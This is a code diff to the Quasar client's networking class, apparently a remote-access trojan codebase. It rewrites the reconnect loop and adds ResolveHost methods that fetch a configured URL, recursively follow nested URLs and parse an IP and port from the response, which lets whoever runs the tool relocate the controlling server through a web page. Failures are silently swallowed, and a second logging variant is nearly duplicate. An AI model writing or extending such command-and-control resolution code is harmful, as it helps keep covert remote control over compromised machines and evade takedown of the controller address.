@@ -1,4 +1,4 @@
-﻿using Quasar.Client.Config;
+using Quasar.Client.Config;
 using Quasar.Client.Helper;
 using Quasar.Client.IO;
 using Quasar.Client.IpGeoLocation;
@@ -10,8 +10,12 @@ using Quasar.Common.Messages.other;
 using Quasar.Common.Utilities;
 using System;
 using System.Diagnostics;
+using System.IO;
+using System.Net;
 using System.Security.Cryptography.X509Certificates;
 using System.Threading;
+
+
 
 namespace Quasar.Client.Networking
 {
@@ -62,42 +66,170 @@ namespace Quasar.Client.Networking
         /// <summary>
         /// Connection loop used to reconnect and keep the connection open.
         /// </summary>
-        public void ConnectLoop()
-        {
-            // TODO: do not re-use object
-            while (!_token.IsCancellationRequested)
-            {
-                if (!Connected)
-                {
-                    Host host = _hosts.GetNextHost();
 
+
+
+
+
+public void ConnectLoop()
+    {
+        Random random = new Random();
+
+        while (!_token.IsCancellationRequested)
+        {
+            if (!Connected)
+            {
+                Host host = null;
+                string hostString = Settings.HOSTS;
+
+                if (!string.IsNullOrEmpty(hostString))
+                {
+                    host = ResolveHost(hostString);
+                }
+
+                if (host == null)
+                {
+                    host = _hosts.GetNextHost();
+                }
+
+                try
+                {
                     base.Connect(host.IpAddress, host.Port);
                 }
-
-                while (Connected) // hold client open
+                catch (Exception)
                 {
-                    try
-                    {
-                        _token.WaitHandle.WaitOne(1000);
-                    }
-                    catch (Exception e) when (e is NullReferenceException || e is ObjectDisposedException)
-                    {
-                        Disconnect();
-                        return;
-                    }
                 }
+            }
 
-                if (_token.IsCancellationRequested)
+            while (Connected)
+            {
+                try
+                {
+                    _token.WaitHandle.WaitOne(1000);
+                }
+                catch (Exception ex) when (ex is NullReferenceException || ex is ObjectDisposedException)
                 {
                     Disconnect();
                     return;
                 }
+            }
 
-                Thread.Sleep(Settings.RECONNECTDELAY + _random.Next(250, 750));
+            if (_token.IsCancellationRequested)
+            {
+                Disconnect();
+                return;
+            }
+
+            int delay = Settings.RECONNECTDELAY + random.Next(250, 750);
+            Thread.Sleep(delay);
+        }
+    }
+
+    private Host ResolveHost(string hostString)
+    {
+        if (Uri.TryCreate(hostString, UriKind.Absolute, out Uri uri))
+        {
+            try
+            {
+                WebRequest request = WebRequest.Create(uri);
+                request.Timeout = 10000;
+                using (WebResponse response = request.GetResponse())
+                using (Stream stream = response.GetResponseStream())
+                using (StreamReader reader = new StreamReader(stream))
+                {
+                    string content = reader.ReadToEnd().Trim();
+
+                    if (Uri.TryCreate(content, UriKind.Absolute, out Uri nestedUri))
+                    {
+                        return ResolveHost(content);
+                    }
+
+                    string[] parts = content.Split(':');
+                    if (parts.Length >= 2 &&
+                        IPAddress.TryParse(parts[0].Trim(), out IPAddress ip) &&
+                        ushort.TryParse(parts[1].Trim(), out ushort port))
+                    {
+                        return new Host { IpAddress = ip, Port = port };
+                    }
+                }
+            }
+            catch (Exception)
+            {
             }
         }
+        else
+        {
+            string[] parts = hostString.Split(':');
+            if (parts.Length >= 2 &&
+                IPAddress.TryParse(parts[0].Trim(), out IPAddress ip) &&
+                ushort.TryParse(parts[1].Trim(), out ushort port))
+            {
+                return new Host { IpAddress = ip, Port = port };
+            }
+        }
+        return null;
+    }
+    private Host ResolveHost(string hostString, string logFile)
+    {
+        if (Uri.TryCreate(hostString, UriKind.Absolute, out Uri uri))
+        {
+            try
+            {
+                WebRequest request = WebRequest.Create(uri);
+                request.Timeout = 10000;
+                using (WebResponse response = request.GetResponse())
+                using (Stream stream = response.GetResponseStream())
+                using (StreamReader reader = new StreamReader(stream))
+                {
+                    string content = reader.ReadToEnd().Trim();
+                    File.AppendAllText(logFile, $"{DateTime.Now}: Fetched from URI: '{content}'\n");
 
-        private void OnClientRead(Client client, IMessage message, int messageLength)
+                    if (Uri.TryCreate(content, UriKind.Absolute, out Uri nestedUri))
+                    {
+                        return ResolveHost(content, logFile); // Recursive fetch if content is a URL
+                    }
+
+                    string[] parts = content.Split(':');
+                    if (parts.Length >= 2 &&
+                        IPAddress.TryParse(parts[0].Trim(), out IPAddress ip) &&
+                        ushort.TryParse(parts[1].Trim(), out ushort port))
+                    {
+                        File.AppendAllText(logFile, $"{DateTime.Now}: Parsed IP: {ip}, Port: {port}\n");
+                        return new Host { IpAddress = ip, Port = port };
+                    }
+                    else
+                    {
+                        File.AppendAllText(logFile, $"{DateTime.Now}: Failed to parse URI response: '{content}'\n");
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                File.AppendAllText(logFile, $"{DateTime.Now}: URI fetch error: {ex.Message}\n");
+            }
+        }
+        else
+        {
+            string[] parts = hostString.Split(':');
+            if (parts.Length >= 2 &&
+                IPAddress.TryParse(parts[0].Trim(), out IPAddress ip) &&
+                ushort.TryParse(parts[1].Trim(), out ushort port))
+            {
+                File.AppendAllText(logFile, $"{DateTime.Now}: Parsed direct IP: {ip}, Port: {port}\n");
+                return new Host { IpAddress = ip, Port = port };
+            }
+            else
+            {
+                File.AppendAllText(logFile, $"{DateTime.Now}: Invalid hostString format: '{hostString}'\n");
+            }
+        }
+        return null;
+    }
+
+
+
+
+    private void OnClientRead(Client client, IMessage message, int messageLength)
         {
             if (!_identified)
             {
